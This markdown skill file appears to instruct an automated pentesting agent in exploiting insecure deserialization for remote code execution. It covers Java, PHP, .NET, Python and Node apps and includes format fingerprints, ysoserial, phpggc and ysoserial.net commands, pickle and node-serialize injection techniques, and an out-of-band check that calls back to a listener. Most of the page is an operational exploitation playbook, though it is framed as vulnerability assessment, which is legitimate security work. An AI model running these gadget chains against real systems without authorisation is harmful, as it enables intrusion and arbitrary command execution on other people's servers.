---
name: web-deserialization
description: Insecure deserialization to RCE for web apps. Use when the app deserializes attacker-controlled data - cookies/tokens/hidden fields/params that are serialized blobs, VIEWSTATE, Java/PHP/.NET/Python/Node apps. Triggers - base64 starting rO0AB or hex AC ED 00 05 (Java), PHP serialize O-prefix, __VIEWSTATE, python pickle, node-serialize, unserialize error, ObjectInputStream.
tags: [vuln_assess, exploitation]
---

# Insecure Deserialization → RCE

## When this fires
Attacker-controlled data is deserialized: cookies/tokens/hidden fields that decode to a serialized object, `__VIEWSTATE`, RMI/HTTP-invoker/message-queue bodies, or a known deser-CVE stack (see web-framework-rce for the CVE map).

## Decide — fingerprint the format FIRST
- base64 `rO0AB...` or raw hex `AC ED 00 05` → **Java** (`ObjectInputStream`).
- `O:8:"ClassName":...` → **PHP** (`unserialize()`).
- `__VIEWSTATE` / `AAEAAAD...` → **.NET** (`BinaryFormatter`/`LosFormatter`).
- python pickle opcodes (`\x80\x04`, `c__builtin__`) → **Python**.
- `{"rce":"_$$ND_FUNC$$_..."}` → **Node** (`node-serialize`).

## Exploit → PROVE IMPACT (gadget chains)
```bash
# Java — ysoserial (pick a gadget matching the classpath: CommonsCollections1-7, URLDNS to test reachability first):
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0        # place in the sink
#   iterate gadgets: URLDNS/JRMPClient to confirm deser happens, then CC/Spring/Hibernate for RCE
# PHP — phpggc (find the framework's gadget: Laravel/Symfony/Monolog/Guzzle):
phpggc Monolog/RCE1 system id
# .NET — ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c ..."
# Python — pickle __reduce__ → os.system('id')  ;  Node — node-serialize _$$ND_FUNC$$_ IIFE
```
**Proof required:** `id`/`uname` (RCE). If the classpath is unknown, confirm deserialization first with a benign OOB gadget (Java URLDNS → your listener), then find the working RCE gadget; log each attempted gadget via `record_vector attempt:` so you don't re-try dead chains.

## Tooling
`ysoserial` (Java), `phpggc` (PHP), `ysoserial.net` (.NET), `gadgetinspector` for custom classpaths; `nuclei -tags deserialization`.

## False positives / pitfalls
- Signed/encrypted blobs (HMAC'd cookies, encrypted VIEWSTATE) → you need the key first (leaked/weak/default) — see web-auth-bypass-idor for key recovery; don't brute blindly.
- Gadget must match the LIBRARIES on the classpath — a failed CC1 doesn't mean not-vulnerable; iterate the gadget set.
- Length/type validation before deser → may need to satisfy a wrapper.
